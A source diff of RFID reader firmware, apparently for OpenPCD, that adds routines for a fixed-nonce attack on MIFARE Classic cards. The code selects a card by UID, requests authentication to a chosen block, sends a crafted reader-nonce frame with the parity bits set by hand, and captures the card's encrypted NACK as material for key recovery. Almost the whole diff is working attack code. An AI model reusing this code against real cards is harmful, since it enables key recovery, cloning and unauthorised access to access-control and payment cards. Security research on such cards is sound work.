@@ -113,9 +113,11 @@ void restoreRC632Reg()
 }
 
 static u_int8_t REQA=0x26;
+static u_int8_t WUPA=0x52;
 static u_int8_t SELECT[2]={0x93,0x20};
 static u_int8_t SELECT_UID[7]={0x93,0x70,0,0,0,0,0};
 static u_int8_t AUTH_BLK_N[2]={0x60, 0x00};
+static u_int8_t HLTA_CRCA[]={0x50,0x00,0x57,0xcd};
 static u_int8_t RxWait;
 static int TX_ON_WAIT;
 //maybe we don't need a return value at all...
@@ -290,34 +292,176 @@ exit:
 	return params->result;
 }
 
+int mifare_fixed_Nt_attack_overhead(struct mifare_crack_params *params)
+{
+	//no disturb from other hardware
+	disableSysIRQ();
+	//store registor old values
+	//backupRC632Reg();
+	//initialize the timer configuration
+	initRC632Timer();//set arbitrary nubmber one time here, timer is NOT that critical here.
+	setRC632Timer(15);
+	//enable the RC632 timer interrupt and idle interrupt
+	initRC632Irq();
+
+	//prepare data for later use
+	AUTH_BLK_N[1]=params->BLOCK;
+	RxWait = params->Nr_Ar_Parity[0];
+	TX_ON_WAIT = params->Nr_Ar_Parity[1];
+	
+	//load crc initial value, LSB and MSB. maybe move this to the very beginning?
+	opcd_rc632_reg_write(NULL, RC632_REG_CRC_PRESET_LSB, 0x63);
+	opcd_rc632_reg_write(NULL, RC632_REG_CRC_PRESET_MSB, 0x63);
+	//Set Rxwait to given value
+	opcd_rc632_reg_write(NULL, RC632_REG_RX_WAIT, RxWait);
+
+	//we should copy the UIC BCC
+	for(int i=0;i<5;i++)
+		SELECT_UID[2+i]=params->UID_BCC[i];
+		
+	return 0;
+}
+
+int mifare_fixed_Nt_attack_realjob(struct mifare_crack_params *params)
+{
+	u_int8_t temp;
+	//////////////////////////////
+	//do REQA
+	//set 7bit short frame
+	opcd_rc632_reg_write(NULL, RC632_REG_BIT_FRAMING, 0x07);
+	//disable CRC and enable parity
+	opcd_rc632_reg_write(NULL, RC632_REG_CHANNEL_REDUNDANCY, 0x03);
+	//enable TX1 and TX2
+	opcd_rc632_reg_write(NULL, RC632_REG_TX_CONTROL, 0x5B);
+	usleep(TX_ON_WAIT);//probably we should not wait too long
+	
+	//do the WUPA tranceive
+	//setFlagRxTimeout();
+	opcd_rc632_fifo_write(NULL, sizeof(WUPA), &WUPA, 0);
+	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
+	//waitFlagRxTimeout();//wait for the command to finish	
+	usleep(700);
+	opcd_rc632_reg_write(NULL, RC632_REG_CONTROL, 1);//flush fifo
+	
+	//////////////////////////////
+	//do anti collision
+	//tranceive, send 0x93 20
+	//setFlagRxTimeout();
+	opcd_rc632_fifo_write(NULL, sizeof(SELECT), SELECT, 0);
+	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
+	//waitFlagRxTimeout();//wait for the command to finish
+	usleep(1200);
+	opcd_rc632_reg_write(NULL, RC632_REG_CONTROL, 1);
+	
+	//enable TX CRC and odd parity, RX CRC disabled
+	opcd_rc632_reg_write(NULL, RC632_REG_CHANNEL_REDUNDANCY, 0x07);
+	
+	//do a tranceive: select(UID): 0x93, 70, UID, BCC 
+	//setFlagRxTimeout();
+	opcd_rc632_fifo_write(NULL, sizeof(SELECT_UID), SELECT_UID, 0);
+	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
+	//waitFlagRxTimeout();//wait for the command to finish
+	usleep(1500);
+	opcd_rc632_reg_write(NULL, RC632_REG_CONTROL, 1);
+		
+	//////////////////////////////
+	//do Auth block N
+	//do a tranceive: 0x60 NN CRC_A
+	//setFlagRxTimeout();
+	opcd_rc632_fifo_write(NULL, sizeof(AUTH_BLK_N), AUTH_BLK_N, 0);
+	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
+	//waitFlagRxTimeout();//wait for the command to finish
+	usleep(1500);
+	temp = opcd_rc632_fifo_read(NULL, 4, params->Nt_actual);//read fifo, should get 32-bit Nt
+	if(temp != 4){
+		//check num of bytes returned, if incorrect, exit with error code
+		params->result = -4;
+		params->BLOCK=temp;//use BLOCK to store the error message
+		goto exit;
+	}
+	
+	//////////////////////////////
+	//send the hacking Nr_Ar_Parity
+	//disable CRC and parity for TX and RX
+	opcd_rc632_reg_write(NULL, RC632_REG_CHANNEL_REDUNDANCY, 0x00);
+	//do a tranceive: Nr_Ar_Parity, 9-bytes with parity bits embedded in bit stream
+
+	//setFlagRxTimeout();
+	opcd_rc632_fifo_write(NULL, 9, params->Nr_Ar_Parity, 0);
+	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
+	//waitFlagRxTimeout();//wait for the command to finish
+	usleep(1200);
+	opcd_rc632_reg_read(NULL, RC632_REG_FIFO_LENGTH, &temp);
+	
+	switch(temp){
+	case 0://most cases, should get nothing
+		params->result = -6;
+		params->BLOCK=temp;//use BLOCK to store the error message
+		goto exit;
+		break;
+	case 1:
+		temp = opcd_rc632_fifo_read(NULL, 1, &(params->NACK_encrypted));//read fifo, should get NACK 
+		params->result = 0;
+		break;
+	default:
+		params->result = -5;
+		params->BLOCK=temp;//use BLOCK to store the error message
+		goto exit;
+		break;
+	}
+	
+	//////////////////////////////
+	//prepare information to return through USB
+	
+exit:	
+	// restore the old register values?
+	//restoreRC632Reg();
+	//enter HLTA state
+	//setFlagRxTimeout();
+	//opcd_rc632_fifo_write(NULL, sizeof(HLTA_CRCA), HLTA_CRCA, 0);
+	//opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
+	//waitFlagRxTimeout();//wait for the command to finish
+	//opcd_rc632_reg_write(NULL, RC632_REG_CONTROL, 1);
+	//resume sys IRQs
+	opcd_rc632_reg_write(NULL, RC632_REG_TX_CONTROL, 0x58);//disable the field
+	enableSysIRQ();
+	return params->result;
+}
+
 enum PROC_STATUS {IDLE=0,INIT=1,PROC=2,};
-volatile u_int8_t proc_status=IDLE;
-volatile struct mifare_crack_params *params_to_proc=NULL;
+volatile u_int8_t proc_status;
+struct mifare_crack_params * volatile params_to_proc;
 
 int mifare_fixed_Nt_attack_async(struct mifare_crack_params *params)
 {
 	if(proc_status != IDLE) return -1;
-	
 	params_to_proc = params;
 	proc_status = INIT;
+	
+	mifare_fixed_Nt_attack_overhead(params);
 	//while loop waiting for finish
 	while(proc_status != IDLE){}
 	params_to_proc = NULL;
 	return params->result;
 }
 
+static AT91PS_TCB tcb = AT91C_BASE_TCB;
+
 static void tc0_irq(void)
 {
+	u_int32_t sr = tcb->TCB_TC0.TC_SR;
 	//do the actual fixed Nt read here
-	if(proc_status == INIT){
-		if(params_to_proc == NULL) return;
-		proc_status = PROC;
-		mifare_fixed_Nt_attack((struct mifare_crack_params *)params_to_proc);
-		proc_status = IDLE;
+	if (sr & AT91C_TC_COVFS){
+		if(proc_status == INIT){
+			if(params_to_proc == NULL) return;
+			proc_status = PROC;
+			//mifare_fixed_Nt_attack((struct mifare_crack_params *)params_to_proc);
+			mifare_fixed_Nt_attack_realjob((struct mifare_crack_params *)params_to_proc);
+			proc_status = IDLE;
+		}
 	}
 }
 
-static AT91PS_TCB tcb = AT91C_BASE_TCB;
 void tc0_tc1_interval_init(void)
 {
 	/* Cfg PA28(TCLK1), and PA0 (TIOA0) as peripheral B */
@@ -346,8 +490,8 @@ void tc0_tc1_interval_init(void)
 							AT91C_TC_BEEVT_NONE | AT91C_TC_BCPB_NONE |	//TIOB1 external event not used, RB compare not rounted out
 							AT91C_TC_EEVT_TIOB | AT91C_TC_ETRGEDG_NONE |	//External event set to TIOB1, but not used (None edge)
 							AT91C_TC_BSWTRG_CLEAR | AT91C_TC_ASWTRG_CLEAR;	//SW trigger resets TIOA, TIOB
-	tcb->TCB_TC1.TC_RC = 128;//128 divider
-	tcb->TCB_TC1.TC_RA = 65;//50 duty cycle
+	tcb->TCB_TC1.TC_RC = 128/4;//128 divider, debug purpose
+	tcb->TCB_TC1.TC_RA = 65/4;//50 duty cycle, debug purpose
 	tcb->TCB_TC1.TC_RB = 0xFFFF;//RB setting is useless since RB not used at all
 	
 	/*TC0 is set to waveform mode, 65536 divider, 50% dutycycle waveform*/
@@ -357,7 +501,7 @@ void tc0_tc1_interval_init(void)
 							AT91C_TC_BEEVT_NONE | AT91C_TC_BCPB_NONE |	//TIOB1 external event not used, RB compare not rounted out
 							AT91C_TC_EEVT_TIOB | AT91C_TC_ETRGEDG_NONE |	//External event set to TIOB1, but not used (None edge)
 							AT91C_TC_BSWTRG_CLEAR | AT91C_TC_ASWTRG_CLEAR;	//SW trigger resets TIOA,  TIOB
-	tcb->TCB_TC0.TC_RC = 0xFFFF;//no use at all
+	tcb->TCB_TC0.TC_RC = 0xFFFE;//no use at all
 	tcb->TCB_TC0.TC_RA = 32769;//50 duty cycle for RA compare
 	tcb->TCB_TC0.TC_RB = 0xFFFF;//RB setting is useless since RB not used at all
 	
@@ -370,4 +514,6 @@ void tc0_tc1_interval_init(void)
 			      OPENPCD_IRQ_PRIO_TC0,
 			      AT91C_AIC_SRCTYPE_INT_POSITIVE_EDGE, &tc0_irq);
 	AT91F_AIC_EnableIt(AT91C_BASE_AIC, AT91C_ID_TC0);
+	proc_status = IDLE;
+	params_to_proc = NULL;
 }
